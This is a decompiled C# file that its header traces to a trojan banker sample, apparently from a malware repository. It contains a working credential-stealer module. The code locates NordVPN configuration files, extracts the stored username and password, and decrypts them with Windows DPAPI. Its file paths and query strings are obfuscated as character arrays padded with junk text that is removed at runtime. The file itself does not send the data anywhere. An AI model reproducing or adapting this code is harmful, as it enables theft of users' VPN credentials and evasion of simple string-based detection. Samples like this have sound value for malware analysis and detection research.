// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Applications.NVPN
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using FtpClient.Data.Helpers;
using FtpClient.Models.Info;
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace FtpClient.Data.Applications
{
  public static class NVPN
  {
    public static List<InfoClass4> GetProfile()
    {
      List<InfoClass4> profile = new List<InfoClass4>();
      try
      {
        DirectoryInfo directoryInfo1 = new DirectoryInfo(Path.Combine(FtpClient.Data.Helpers.Constants.LocalAppData, new string(new char[16]
        {
          'N',
          'o',
          'D',
          'e',
          'f',
          'r',
          'd',
          'D',
          'e',
          'f',
          'V',
          'P',
          'N',
          'D',
          'e',
          'f'
        }).Replace("Def", string.Empty)));
        if (!directoryInfo1.Exists)
          return profile;
        DirectoryInfo directoryInfo2 = directoryInfo1;
        string searchPattern = new string(new char[24]
        {
          'N',
          'W',
          'i',
          'n',
          'o',
          'r',
          'd',
          'V',
          'W',
          'i',
          'n',
          'p',
          'n',
          '.',
          'e',
          'W',
          'i',
          'n',
          'x',
          'e',
          '*',
          'W',
          'i',
          'n'
        }).Replace("Win", string.Empty);
        foreach (DirectoryInfo directory1 in directoryInfo2.GetDirectories(searchPattern))
        {
          foreach (DirectoryInfo directory2 in directory1.GetDirectories())
          {
            try
            {
              string str1 = Path.Combine(directory2.FullName, new string(new char[11]
              {
                'u',
                's',
                'e',
                'r',
                '.',
                'c',
                'o',
                'n',
                'f',
                'i',
                'g'
              }));
              if (File.Exists(str1))
              {
                XmlDocument xmlDocument = new XmlDocument();
                xmlDocument.Load(str1);
                string innerText1 = xmlDocument.SelectSingleNode(new string(new char[33]
                {
                  '/',
                  '/',
                  's',
                  'e',
                  't',
                  't',
                  'i',
                  'n',
                  'g',
                  '[',
                  '@',
                  'n',
                  'a',
                  'm',
                  'e',
                  '=',
                  '\'',
                  'U',
                  's',
                  'e',
                  'r',
                  'n',
                  'a',
                  'm',
                  'e',
                  '\'',
                  ']',
                  '/',
                  'v',
                  'a',
                  'l',
                  'u',
                  'e'
                })).InnerText;
                string innerText2 = xmlDocument.SelectSingleNode(new string(new char[33]
                {
                  '/',
                  '/',
                  's',
                  'e',
                  't',
                  't',
                  'i',
                  'n',
                  'g',
                  '[',
                  '@',
                  'n',
                  'a',
                  'm',
                  'e',
                  '=',
                  '\'',
                  'P',
                  'a',
                  's',
                  's',
                  'w',
                  'o',
                  'r',
                  'd',
                  '\'',
                  ']',
                  '/',
                  'v',
                  'a',
                  'l',
                  'u',
                  'e'
                })).InnerText;
                if (!string.IsNullOrWhiteSpace(innerText1) && !string.IsNullOrWhiteSpace(innerText2))
                {
                  string str2 = Encoding.UTF8.GetString(CryptoHelper.DecryptBlob(Convert.FromBase64String(innerText1), DataProtectionScope.LocalMachine));
                  string str3 = Encoding.UTF8.GetString(CryptoHelper.DecryptBlob(Convert.FromBase64String(innerText2), DataProtectionScope.LocalMachine));
                  if (!string.IsNullOrWhiteSpace(str2) && !string.IsNullOrWhiteSpace(str3))
                    profile.Add(new InfoClass4()
                    {
                      Object2 = str2,
                      Object3 = str3
                    });
                }
              }
            }
            catch
            {
            }
          }
        }
      }
      catch
      {
      }
      return profile;
    }
  }
}
